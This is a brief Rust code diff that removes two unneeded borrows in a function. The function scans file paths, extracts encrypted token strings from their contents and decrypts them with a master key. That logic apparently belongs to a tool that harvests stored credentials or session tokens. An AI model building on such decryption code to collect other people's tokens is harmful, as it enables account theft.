@@ -114,7 +114,7 @@ where
     let mut result = Vec::new();
 
     for path in paths {
-        if !filesystem.is_exists(&path) {
+        if !filesystem.is_exists(path) {
             continue;
         }
 
@@ -151,7 +151,7 @@ where
         let encrypted_tokens = extract_encrypted_token_strings(&content);
 
         for encrypted_token in encrypted_tokens {
-            if let Some(decrypted) = decrypt_token(encrypted_token, &master_key) {
+            if let Some(decrypted) = decrypt_token(encrypted_token, master_key) {
                 result.push(decrypted);
             }
         }
